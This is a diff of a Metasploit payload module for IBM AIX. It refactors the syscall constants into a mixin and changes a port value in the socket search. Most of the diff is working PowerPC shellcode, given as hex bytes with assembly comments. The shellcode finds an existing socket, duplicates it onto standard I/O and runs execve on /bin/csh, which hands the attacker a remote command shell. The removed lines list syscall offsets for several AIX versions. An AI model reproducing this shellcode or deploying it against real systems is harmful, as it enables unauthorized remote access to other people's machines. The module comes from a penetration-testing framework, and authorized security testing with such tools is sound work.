@@ -18,6 +18,7 @@ require 'msf/base/sessions/command_shell'
 module Metasploit3
 
 	include Msf::Payload::Single
+	include Msf::Payload::Aix
 
 	def initialize(info = {})
 		super(merge_info(info,
@@ -39,42 +40,12 @@ module Metasploit3
 				}
 			))
 
-	register_options(
-	  [
-		OptString.new('AIXLEVEL', [ true, "AIX Level", "5.3.0" ]),
-	  ], self.class)
 	end
 
-	def generate
-		case datastore['AIXLEVEL']
-		when '4.1.0'
-			cal_getpeername = "\x38\x5d\xfe\x44"      #   cal     r2,-444(r29)               #
-			cal_close       = "\x38\x5d\xfe\x5f"      #   cal     r2,-417(r29)               #
-			cal_kfcntl      = "\x38\x5d\xfe\xd7"      #   cal     r2,-297(r29)               #
-			cal_execve      = "\x38\x5d\xfe\x04"      #   cal     r2,-508(r29)               #
-		when '4.2.0'
-			cal_getpeername = "\x38\x5d\xfe\x49"      #   cal     r2,-439(r29)               #
-			cal_close       = "\x38\x5d\xfe\x63"      #   cal     r2,-413(r29)               #
-			cal_kfcntl      = "\x38\x5d\xfe\xe8"      #   cal     r2,-280(r29)               #
-			cal_execve      = "\x38\x5d\xfe\x03"      #   cal     r2,-509(r29)               #
-		when '4.3.0'
-			cal_getpeername = "\x38\x5d\xfe\x56"      #   cal     r2,-426(r29)               #
-			cal_close       = "\x38\x5d\xfe\x72"      #   cal     r2,-398(r29)               #
-			cal_kfcntl      = "\x38\x5d\xfe\xfd"      #   cal     r2,-259(r29)               #
-			cal_execve      = "\x38\x5d\xfe\x05"      #   cal     r2,-507(r29)               #
-		when '4.3.3'
-			cal_getpeername = "\x38\x5d\xfe\x66"      #   cal     r2,-410(r29)               #
-			cal_close       = "\x38\x5d\xfe\x83"      #   cal     r2,-381(r29)               #
-			cal_kfcntl      = "\x38\x5d\xff\x10"      #   cal     r2,-240(r29)               #
-			cal_execve      = "\x38\x5d\xfe\x04"      #   cal     r2,-508(r29)               #
-		when '5.3.0'
-			cal_getpeername = "\x38\x5d\xfe\x7b"      #   cal     r2,-389(r29)               #
-			cal_close       = "\x38\x5d\xfe\xa1"      #   cal     r2,-351(r29)               #
-			cal_kfcntl      = "\x38\x5d\xff\x43"      #   cal     r2,-189(r29)               #
-			cal_execve      = "\x38\x5d\xfe\x06"      #   cal     r2,-506(r29)               #
-		end
+	def generate(*args)
+		super(*args)
 
-	payload =
+		payload =
 		"\x7f\xff\xfa\x79"     +#   xor.    r31,r31,r31                #
 		"\x40\x82\xff\xfd"     +#   bnel    <fndsockcode>              #
 		"\x7f\xc8\x02\xa6"     +#   mflr    r30                        #
@@ -96,22 +67,22 @@ module Metasploit3
 		"\x7f\x65\xdb\x78"     +#   mr      r5,r27                     #
 		"\x7f\x84\xe3\x78"     +#   mr      r4,r28                     #
 		"\x7f\xe3\xfb\x78"     +#   mr      r3,r31                     #
-		cal_getpeername +
+		@cal_getpeername +
 		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
 		"\x4e\x80\x04\x21"     +#   bctrl                              #
 		"\x3b\x5c\x01\xff"     +#   cal     r26,511(r28)               #
 		"\xa3\x5a\xfe\x03"     +#   lhz     r26,-509(r26)              #
-		"\x28\x1a\x04\xd2"     +#   cmpli   0,r26,1234                 #
+		"\x28\x1a\x11\x5c"     +#   cmpli   0,r26,4444                 #
 		"\x40\x82\xff\xd4"     +#   bne     <fndsockcode+64>           #
 		"\x3b\x3d\xfe\x03"     +#   cal     r25,-509(r29)              #
 		"\x7f\x23\xcb\x78"     +#   mr      r3,r25                     #
-		cal_close +
+		@cal_close +
 		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
 		"\x4e\x80\x04\x21"     +#   bctrl                              #
 		"\x7f\x25\xcb\x78"     +#   mr      r5,r25                     #
 		"\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
 		"\x7f\xe3\xfb\x78"     +#   mr      r3,r31                     #
-		cal_kfcntl +
+		@cal_kfcntl +
 		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
 		"\x4e\x80\x04\x21"     +#   bctrl                              #
 		"\x37\x39\xff\xff"     +#   ai.     r25,r25,-1                 #
@@ -125,7 +96,7 @@ module Metasploit3
 		"\x94\xa1\xff\xfc"     +#   stu     r5,-4(r1)                  #
 		"\x94\x61\xff\xfc"     +#   stu     r3,-4(r1)                  #
 		"\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
-		cal_execve +
+		@cal_execve +
 		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
 		"\x4e\x80\x04\x20"     +#   bctr                               #
 		"/bin/csh"
